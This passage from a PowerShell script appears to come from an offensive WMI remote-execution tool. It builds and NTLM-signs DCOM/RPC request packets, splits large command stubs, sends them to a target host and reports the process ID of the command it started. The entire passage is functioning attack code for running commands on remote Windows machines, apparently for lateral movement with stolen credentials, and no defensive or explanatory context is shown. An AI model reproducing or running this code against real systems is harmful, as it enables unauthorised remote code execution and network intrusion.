                                                0x00,0x80,0x00,0x5f,0x5f,0x50,0x41,0x52,0x41,0x4d,0x45,0x54,0x45,
                                                0x52,0x53,0x00,0x00 +
                                                $command_bytes +
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x04,0x00,0x02,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00
                                
                                if($Stub_data.Length -lt $request_split_index)
                                {
                                    $request_flags = 0x83
                                    $WMI_client_stage_next = 'Result'
                                }
                                else
                                {
                                    $request_split = $true
                                    $request_split_stage_final = [Math]::Ceiling($stub_data.Length / $request_split_index)

                                    if($request_split_stage -lt 2)
                                    {
                                        $request_length = $stub_data.Length
                                        $stub_data = $stub_data[0..($request_split_index - 1)]
                                        $request_split_stage = 2
                                        $sequence_number_counter = 10
                                        $request_flags = 0x81
                                        $request_split_index_tracker = $request_split_index
                                        $WMI_client_stage_next = 'Request'
                                    }
                                    elseif($request_split_stage -eq $request_split_stage_final)
                                    {
                                        $request_split = $false
                                        $sequence_number = [System.BitConverter]::GetBytes($sequence_number_counter)
                                        $request_split_stage = 0
                                        $stub_data = $stub_data[$request_split_index_tracker..$stub_data.Length]
                                        $request_flags = 0x82
                                        $WMI_client_stage_next = 'Result'
                                    }
                                    else
                                    {
                                        $request_length = $stub_data.Length - $request_split_index_tracker
                                        $stub_data = $stub_data[$request_split_index_tracker..($request_split_index_tracker + $request_split_index - 1)]
                                        $request_split_index_tracker += $request_split_index
                                        $request_split_stage++
                                        $sequence_number = [System.BitConverter]::GetBytes($sequence_number_counter)
                                        $sequence_number_counter++
                                        $request_flags = 0x80
                                        $WMI_client_stage_next = 'Request'
                                    }

                                }

                            }

                        }

                        $packet_RPC = New-PacketRPCRequest $request_flags $stub_data.Length 16 $request_auth_padding $request_call_ID $request_context_ID $request_opnum $request_UUID

                        if($request_split)
                        {
                            $packet_RPC["AllocHint"] = [System.BitConverter]::GetBytes($request_length)
                        }

                        $packet_NTLMSSP_verifier = New-PacketNTLMSSPVerifier $request_auth_padding 0x04 $sequence_number
                        $RPC = ConvertFrom-PacketOrderedDictionary $packet_RPC
                        $NTLMSSP_verifier = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_verifier 
                        $RPC_signature = $HMAC_MD5.ComputeHash($sequence_number + $RPC + $stub_data + $NTLMSSP_verifier[0..($request_auth_padding + 7)])
                        $RPC_signature = $RPC_signature[0..7]
                        $packet_NTLMSSP_verifier["NTLMSSPVerifierChecksum"] = $RPC_signature
                        $NTLMSSP_verifier = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_verifier
                        $WMI_client_send = $RPC + $stub_data + $NTLMSSP_verifier
                        $WMI_client_random_port_stream.Write($WMI_client_send,0,$WMI_client_send.Length) > $null
                        $WMI_client_random_port_stream.Flush()

                        if(!$request_split)
                        {
                            $WMI_client_random_port_stream.Read($WMI_client_receive,0,$WMI_client_receive.Length) > $null
                        }

                        while($WMI_client_random_port_stream.DataAvailable)
                        {
                            $WMI_client_random_port_stream.Read($WMI_client_receive,0,$WMI_client_receive.Length) > $null
                            Start-Sleep -m $Sleep
                        }

                        $WMI_client_stage = $WMI_client_stage_next
                    }

                    'Result'
                    {

                        while($WMI_client_random_port_stream.DataAvailable)
                        {
                            $WMI_client_random_port_stream.Read($WMI_client_receive,0,$WMI_client_receive.Length) > $null
                            Start-Sleep -m $Sleep
                        }

                        if($WMI_client_receive[1145] -ne 9)
                        { 
                            $target_process_ID = Get-UInt16DataLength 1141 $WMI_client_receive
                            Write-Output "[+] Command executed with process ID $target_process_ID on $target_long"
                        }
                        else
                        {
                            Write-Output "[-] Process did not start, check your command"
                        }

                        $WMI_client_stage = 'Exit'
                    }

                }

                Start-Sleep -m $Sleep
            
            }

            $WMI_client_random_port.Close()
            $WMI_client_random_port_stream.Close()
        }

        $WMI_client.Close()
        $WMI_client_stream.Close()
    }

}

}